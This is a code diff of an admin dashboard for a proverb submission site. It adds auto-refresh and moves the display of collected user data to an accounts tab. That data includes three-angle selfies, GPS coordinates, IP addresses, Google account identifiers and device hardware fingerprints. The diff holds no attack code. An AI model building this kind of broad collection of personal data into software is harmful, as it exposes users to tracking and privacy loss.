@@ -75,14 +75,23 @@
   .api-metric small{font-size:11.5px;color:var(--muted);display:block;margin-bottom:3px}
   .api-metric b{font-size:16px;color:var(--ink);display:block;word-break:break-all}
   .api-metric span{font-size:11px;color:#067647;font-weight:600}
+  .sync-pill{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;border-radius:99px;background:#f6f3ee;border:1px solid var(--line);font-size:12px;color:var(--muted);font-weight:600}
+  .sync-dot{width:8px;height:8px;border-radius:50%;background:#10b981;box-shadow:0 0 0 3px #10b98128;animation:pulse 2s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}
+  .u-badge{font-size:11.5px;padding:3px 9px;border-radius:99px;font-weight:700;background:#e8f6ee;color:#067647;border:1px solid #a6e0c2;white-space:nowrap}
+  .u-badge.warn{background:#fef3c7;color:#b45309;border-color:#fde68a}
 </style>
 </head>
 <body>
 <header>
   <h1 id="pageTitle">投稿管理<span class="badge" id="count">0</span></h1>
+  <div class="sync-pill" title="系統每 3 秒自動同步最新投稿、帳號資訊與 Supabase 即時狀態">
+    <span class="sync-dot" id="syncDot"></span>
+    <span id="syncText">即時自動同步中</span>
+  </div>
   <button id="toggleUsers" class="s">已登入帳號 (<span id="uCount">0</span>)</button>
   <label class="sz" id="szWrap">文字大小 <input id="size" type="number" min="24" max="200" step="2"></label>
-  <button id="reload" class="s">重新整理</button>
+  <button id="reload" class="s">立即重整</button>
   <button id="dlAll">全部下載 ZIP</button>
   <button id="logout" class="s">登出</button>
 </header>
@@ -102,10 +111,10 @@
         <div class="jp-flag" title="Tokyo (ap-northeast-1)"></div>
       </div>
       <div class="db-foot">
-        <span><strong>CPU</strong> <span id="stCpu">2%</span></span> ·
-        <span><strong>Disk</strong> <span id="stDisk">14%</span></span> ·
-        <span><strong>RAM</strong> <span id="stRam">54%</span></span> ·
-        <span><span id="stConns">7/60</span> conns</span>
+        <span><strong>CPU</strong> <span id="stCpu">—%</span></span> ·
+        <span><strong>Disk</strong> <span id="stDisk">—%</span></span> ·
+        <span><strong>RAM</strong> <span id="stRam">—%</span></span> ·
+        <span><span id="stConns">—/60</span> conns</span>
       </div>
     </div>
 
@@ -156,19 +165,11 @@
 <script>
 const $ = id => document.getElementById(id);
 let rows = [], users = [], userMap = {}, showUsers = false;
+let lastRowsSig = "", lastUsersSig = "", isLoading = false;
 const H = { "Content-Type": "application/json", "X-Requested-With": "fetch" };
 
 /* ---------- 卡片繪製：768x1024 米白圓角卡 + 黑色粗體字 ---------- */
 const FONT = '"Reggae One","Noto Serif TC",serif';
-function wrap(ctx, text, maxW) {
-  const lines = []; let cur = "";
-  for (const ch of text) {
-    if (ch === "\n" || ctx.measureText(cur + ch).width > maxW) { lines.push(cur); cur = ch === "\n" ? "" : ch; }
-    else cur += ch;
-  }
-  if (cur) lines.push(cur);
-  return lines;
-}
 let FONT_SIZE = parseInt(localStorage.getItem("cardFontSize")) || 70;
 function drawCard(canvas, text, author) {
   const W = 768, H = 1024; canvas.width = W; canvas.height = H;
@@ -202,58 +203,90 @@ function drawCard(canvas, text, author) {
 }
 async function ensureFont(text) { try { await document.fonts.load(`40px ${FONT}`, text); } catch {} }
 
-/* ---------- 資料 ---------- */
+/* ---------- 即時狀態與自動重整 ---------- */
 function applyAdminStatus(st) {
   if (!st) return;
   $("dbIco").classList.toggle("err", !st.ok);
   $("dbName").textContent = st.dbName || "Primary Database";
   $("dbRegion").textContent = st.regionName || "Northeast Asia (Tokyo)";
   $("dbSpec").textContent = `${st.regionCode || "ap-northeast-1"} · ${st.instanceType || "t3.nano"}`;
-  $("stCpu").textContent = st.cpuPct + "%";
-  $("stDisk").textContent = st.diskPct + "%";
-  $("stRam").textContent = st.ramPct + "%";
-  $("stConns").textContent = `${st.conns}/${st.maxConns}`;
-  $("stRef").textContent = st.projectRef;
+  $("stCpu").textContent = (st.cpuPct ?? "—") + "%";
+  $("stDisk").textContent = (st.diskPct ?? "—") + "%";
+  $("stRam").textContent = (st.ramPct ?? "—") + "%";
+  $("stConns").textContent = `${st.conns ?? "—"}/${st.maxConns ?? 60}`;
+  $("stRef").textContent = st.projectRef || "—";
   $("stHealth").textContent = st.ok ? "● PostgreSQL 100% 即時連線" : "● 連線異常";
   $("stHealth").style.color = st.ok ? "#067647" : "#b42318";
-  $("stLatency").textContent = st.latencyMs + " ms";
-  $("stCache").textContent = `快取命中 ${st.cacheHitPct}%`;
-  $("stRealRam").textContent = `${st.memUsedMb} / ${st.memTotalMb} MB`;
-  $("stRealDisk").textContent = `Disk ${st.diskUsedMb} MB / ${st.diskTotalGb} GB`;
-  $("stDbSize").textContent = st.dbSizeMb + " MB";
-  $("stWalSize").textContent = `WAL ${st.walSizeMb} MB`;
-  $("stQueries").textContent = `${st.totalQueries} 條查詢`;
-  $("stXact").textContent = `Commit ${st.xactCommit} · Rollback ${st.xactRollback}`;
-  $("stTuples").textContent = `+${st.tupInserted} / 改${st.tupUpdated} / 刪${st.tupDeleted}`;
-  $("stNet").textContent = `⬇ ${st.netRxMb} MB · ⬆ ${st.netTxMb} MB`;
-  $("stLoad").textContent = `${st.load1} / ${st.load5} / ${st.load15}`;
-  $("stCounts").textContent = `貼文 ${st.proverbsCount} 篇 · 帳號 ${st.usersCount} 人`;
+  $("stLatency").textContent = (st.latencyMs ?? "—") + " ms";
+  $("stCache").textContent = `快取命中 ${st.cacheHitPct ?? "—"}%`;
+  $("stRealRam").textContent = `${st.memUsedMb ?? "—"} / ${st.memTotalMb ?? "—"} MB`;
+  $("stRealDisk").textContent = `Disk ${st.diskUsedMb ?? "—"} MB / ${st.diskTotalGb ?? "—"} GB`;
+  $("stDbSize").textContent = (st.dbSizeMb ?? "—") + " MB";
+  $("stWalSize").textContent = `WAL ${st.walSizeMb ?? "—"} MB`;
+  $("stQueries").textContent = `${st.totalQueries ?? "—"} 條查詢`;
+  $("stXact").textContent = `Commit ${st.xactCommit ?? "—"} · Rollback ${st.xactRollback ?? "—"}`;
+  $("stTuples").textContent = `+${st.tupInserted ?? 0} / 改${st.tupUpdated ?? 0} / 刪${st.tupDeleted ?? 0}`;
+  $("stNet").textContent = `⬇ ${st.netRxMb ?? "—"} MB · ⬆ ${st.netTxMb ?? "—"} MB`;
+  $("stLoad").textContent = `${st.load1 ?? "—"} / ${st.load5 ?? "—"} / ${st.load15 ?? "—"}`;
+  $("stCounts").textContent = `貼文 ${st.proverbsCount ?? rows.length} 篇 · 帳號 ${st.usersCount ?? users.length} 人`;
 }
 
-async function refreshAdminStatus() {
+function updateHeaderCounts() {
+  $("toggleUsers").classList.toggle("active", showUsers);
+  $("toggleUsers").innerHTML = showUsers
+    ? `← 返回投稿卡片 (${rows.length})`
+    : `已登入帳號 (<span id="uCount">${users.length}</span>)`;
+  $("pageTitle").innerHTML = (showUsers ? "已登入帳號列表" : "投稿管理") + `<span class="badge" id="count">${showUsers ? users.length : rows.length}</span>`;
+}
+
+function isEditingCard() {
+  const a = document.activeElement;
+  return a && $("grid").contains(a) && (a.tagName === "TEXTAREA" || a.tagName === "INPUT");
+}
+
+async function load(forceRender = false) {
+  if (isLoading) return;
+  isLoading = true;
   try {
-    const rs = await fetch("/api/admin/status");
+    const [rp, ru, rs] = await Promise.all([
+      fetch("/api/admin/proverbs"),
+      fetch("/api/admin/users"),
+      fetch("/api/admin/status"),
+    ]);
+    if (rp.status === 404 || ru.status === 404) { location.reload(); return; }
+    const nextRows = rp.ok ? await rp.json() : rows;
+    const nextUsers = ru.ok ? await ru.json() : users;
     if (rs.ok) applyAdminStatus(await rs.json());
-  } catch {}
-}
-setInterval(refreshAdminStatus, 10000);
 
-async function load() {
-  const [rp, ru, rs] = await Promise.all([
-    fetch("/api/admin/proverbs"),
-    fetch("/api/admin/users"),
-    fetch("/api/admin/status"),
-  ]);
-  if (rp.status === 404 || ru.status === 404) return location.reload();   // session 過期
-  rows = rp.ok ? await rp.json() : [];
-  users = ru.ok ? await ru.json() : [];
-  if (rs.ok) applyAdminStatus(await rs.json());
-  userMap = {};
-  for (const u of users) { userMap[u.id] = u; userMap[u.email] = u; }
-  $("uCount").textContent = users.length;
-  render();
-  renderUsers();
+    rows = nextRows;
+    users = nextUsers;
+    userMap = {};
+    for (const u of users) { userMap[u.id] = u; userMap[u.email] = u; }
+
+    updateHeaderCounts();
+    const nowStr = new Date().toLocaleTimeString("zh-TW", { hour12: false });
+    $("syncText").textContent = `即時自動重整 · ${nowStr}`;
+
+    const rowsSig = rows.map(r => `${r.id}:${r.content}:${r.author}:${r.user_name}`).join("|");
+    const usersSig = users.map(u => `${u.id}:${u.login_count}:${u.post_count}:${u.last_sign_in_at}:${u.last_ip}:${u.last_device}:${u.selfie_at}:${u.geo ? u.geo.lat + "," + u.geo.lng : ""}`).join("|");
+
+    if (forceRender || (rowsSig !== lastRowsSig && !isEditingCard())) {
+      lastRowsSig = rowsSig;
+      await render();
+    }
+    if (forceRender || usersSig !== lastUsersSig) {
+      lastUsersSig = usersSig;
+      renderUsers();
+    }
+  } catch {} finally {
+    isLoading = false;
+  }
 }
+
+// 每 3 秒自動即時整理與重整所有資訊；切換回分頁時也立即同步
+setInterval(() => load(false), 3000);
+document.addEventListener("visibilitychange", () => { if (!document.hidden) load(false); });
+
 const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
 const fname = r => `${r.id}_${(r.user_email || "").split("@")[0]}.png`;
 function save(blob, name) {
@@ -280,69 +313,21 @@ function unpackRow(r) {
     ...r,
     display_name: name || u.name || (r.user_email || "").split("@")[0],
     device_info: r.device_info || meta.device_info || u.last_device || "未記錄裝置",
-    user_agent: r.user_agent || meta.user_agent || u.last_ua || "",
-    ip_address: r.ip_address || meta.ip_address || u.last_ip || "",
-    google_sub: r.google_sub || meta.google_sub || u.google_sub || "",
-    given_name: meta.given_name || u.given_name || "",
-    family_name: meta.family_name || u.family_name || "",
-    picture: r.user_avatar || meta.picture || u.picture || "",
-    selfie: u.selfie || "",
-    selfie_right: u.selfie_right || "",
-    selfie_left: u.selfie_left || "",
-    hd: meta.hd || u.hd || "",
-    locale: meta.locale || u.locale || "",
-    timezone: meta.timezone || u.timezone || "",
-    geo: meta.geo || u.geo || null,
-    gpu: meta.gpu || u.gpu || "",
-    cores: meta.cores || u.cores || "",
-    memory: meta.memory || u.memory || "",
-    battery: meta.battery || u.battery || "",
-    network: meta.network || u.network || "",
   };
 }
 
+/* 投稿管理：保持乾淨簡潔（詳細收集的資訊全部整理至「已登入帳號」分頁中顯示） */
 async function render() {
-  $("count").textContent = showUsers ? users.length : rows.length;
   const grid = $("grid"); grid.innerHTML = "";
   if (!rows.length) { grid.innerHTML = '<div class="empty">目前還沒有投稿</div>'; return; }
   await ensureFont(rows.map(r => r.content + r.author).join(""));
   for (const raw of rows) {
     const r = unpackRow(raw);
     const el = document.createElement("div"); el.className = "item";
-    const hw = [
-      r.gpu ? `GPU: ${esc(r.gpu)}` : "",
-      r.cores ? `CPU: ${esc(r.cores)}` : "",
-      r.memory ? `RAM: ${esc(r.memory)}` : "",
-      r.battery ? `電量: ${esc(r.battery)}` : "",
-      r.network ? `網路: ${esc(r.network)}` : "",
-    ].filter(Boolean).join(" · ");
-
     el.innerHTML = `<div class="meta">
-        <b>#${r.id} · ${esc(r.display_name)}</b> · 🕒 ${new Date(r.created_at).toLocaleString()}
-        <div class="mini-photos">
-          <div class="mp">
-            ${r.picture ? `<img src="${esc(r.picture)}" title="點擊放大 Google 帳號頭貼" onclick="window.open(this.src)" referrerpolicy="no-referrer">` : ""}
-            <span><b>🔹 Google 帳號</b><br>${esc(r.user_email)}</span>
-          </div>
-          <div class="mp" style="margin-left:auto">
-            ${r.selfie ? `<img src="${esc(r.selfie)}" title="實拍：正面（點擊放大）" onclick="window.open(this.src)">` : ""}
-            ${r.selfie_right ? `<img src="${esc(r.selfie_right)}" title="實拍：向右（點擊放大）" onclick="window.open(this.src)">` : ""}
-            ${r.selfie_left ? `<img src="${esc(r.selfie_left)}" title="實拍：向左（點擊放大）" onclick="window.open(this.src)">` : ""}
-            <span><b>${r.selfie ? "🔸 實拍 3 張" : "未拍攝實拍照"}</b></span>
-          </div>
-        </div>
-        <div class="u-sec">
-          <span class="u-sec-title">🔹 Google 帳號原始資料</span><br>
-          姓名：<strong>${esc(r.display_name)}</strong>（姓：${esc(r.family_name || "—")} / 名：${esc(r.given_name || "—")}）<br>
-          Google ID：${esc(r.google_sub || "—")} · 網域：${esc(r.hd || "—")}
-        </div>
-        <div class="u-sec" style="margin-top:6px">
-          <span class="u-sec-title">🔸 我們收集的環境與定位資訊</span><br>
-          💻 裝置／瀏覽器：<strong>${esc(r.device_info)}</strong><br>
-          📍 GPS 位置：${fmtGeo(r.geo)}<br>
-          🌐 IP 位址：<strong>${esc(r.ip_address || "—")}</strong> · 時區/語系：${esc(r.timezone || "—")} / ${esc(r.locale || "—")}
-          ${hw ? `<br>⚙️ 硬體細節：${hw}` : ""}
-        </div>
+        <b>#${r.id} · ${esc(r.display_name)}</b><br>
+        📧 ${esc(r.user_email)} · 🕒 ${new Date(r.created_at).toLocaleString()}<br>
+        💻 裝置／瀏覽器：${esc(r.device_info)}
       </div>
       <canvas></canvas><textarea rows="2"></textarea><input placeholder="來源">
       <div class="row"><button class="dl">下載 PNG</button><button class="d del">刪除</button></div>`;
@@ -353,12 +338,14 @@ async function render() {
     el.querySelector(".dl").onclick = () => cv.toBlob(b => save(b, fname(r)));
     el.querySelector(".del").onclick = async () => {
       if (!confirm("確定刪除？")) return;
-      await fetch("/api/admin/proverbs/" + r.id, { method: "DELETE", headers: H }); load();
+      await fetch("/api/admin/proverbs/" + r.id, { method: "DELETE", headers: H });
+      load(true);
     };
     grid.appendChild(el);
   }
 }
 
+/* 已登入帳號：集中顯示所有收集的資訊（Google 帳號原始資料 + 3 張相機核實照 + GPS 定位 + 硬體與環境資訊 + 登入/貼文統計） */
 function renderUsers() {
   const ug = $("usersGrid"); ug.innerHTML = "";
   if (!users.length) { ug.innerHTML = '<div class="empty">目前還沒有任何登入過的帳號</div>'; return; }
@@ -371,6 +358,9 @@ function renderUsers() {
     const lastLogin = u.last_sign_in_at ? new Date(u.last_sign_in_at).toLocaleString() : "未知";
     const createdAt = u.created_at ? new Date(u.created_at).toLocaleString() : "未知";
     const selfieAt = u.selfie_at ? new Date(u.selfie_at).toLocaleString() : "";
+    const verifiedBadge = u.selfie
+      ? `<span class="u-badge">✓ 已完成 3 角度實拍核實</span>`
+      : `<span class="u-badge warn">尚未完成實拍</span>`;
 
     el.innerHTML = `
       <div class="u-head">
@@ -379,6 +369,7 @@ function renderUsers() {
           <b>${esc(displayName)}</b>
           <span>${esc(u.email)}</span>
         </div>
+        ${verifiedBadge}
       </div>
       <div class="u-photos">
         <div class="u-pbox">
@@ -410,7 +401,7 @@ function renderUsers() {
         <div>🔑 <strong>Google 唯一 ID (sub)：</strong>${esc(u.google_sub || "—")}</div>
       </div>
       <div class="u-sec">
-        <div class="u-sec-title">🔸 我們收集的資訊（相機核實／定位／硬體環境）</div>
+        <div class="u-sec-title">🔸 我們收集的資訊（相機核實／定位／裝置硬體環境）</div>
         <div>🕒 <strong>最後登入時間：</strong>${esc(lastLogin)}</div>
         <div>📅 <strong>首次註冊時間：</strong>${esc(createdAt)}${selfieAt ? `（實拍核實：${esc(selfieAt)}）` : ""}</div>
         <div>📍 <strong>GPS 定位座標：</strong>${fmtGeo(u.geo)}</div>
@@ -419,6 +410,7 @@ function renderUsers() {
         <div>🖥️ <strong>顯示晶片 (GPU)：</strong>${esc(u.gpu || "—")}</div>
         <div>⚙️ <strong>CPU / 記憶體 / 電量：</strong>${esc(u.cores || "—")} / ${esc(u.memory || "—")} / ${esc(u.battery || "—")}</div>
         <div>🌍 <strong>語系 / 時區：</strong>${esc(u.locale || "—")} / ${esc(u.timezone || "—")}</div>
+        ${u.last_ua ? `<div style="font-size:11.5px;margin-top:4px;opacity:.85">🧭 <strong>User-Agent：</strong>${esc(u.last_ua)}</div>` : ""}
       </div>`;
     ug.appendChild(el);
   }
@@ -426,11 +418,7 @@ function renderUsers() {
 
 $("toggleUsers").onclick = () => {
   showUsers = !showUsers;
-  $("toggleUsers").classList.toggle("active", showUsers);
-  $("toggleUsers").innerHTML = showUsers
-    ? `← 返回投稿卡片 (${rows.length})`
-    : `已登入帳號 (<span id="uCount">${users.length}</span>)`;
-  $("pageTitle").innerHTML = (showUsers ? "已登入帳號列表" : "投稿管理") + `<span class="badge" id="count">${showUsers ? users.length : rows.length}</span>`;
+  updateHeaderCounts();
   $("grid").classList.toggle("hide", showUsers);
   $("usersGrid").classList.toggle("hide", !showUsers);
   $("szWrap").classList.toggle("hide", showUsers);
@@ -445,7 +433,7 @@ $("dlAll").onclick = async () => {
   }
   save(await zip.generateAsync({ type: "blob" }), "proverbs.zip");
 };
-$("reload").onclick = load;
+$("reload").onclick = () => load(true);
 $("size").value = FONT_SIZE;
 $("size").oninput = () => {
   const v = Math.min(200, Math.max(24, parseInt($("size").value) || 70));
@@ -456,7 +444,7 @@ $("size").oninput = () => {
   });
 };
 $("logout").onclick = async () => { await fetch("/api/admin/logout", { method: "POST", headers: H }); location.replace("/"); };
-load();
+load(true);
 </script>
 </body>
 </html>
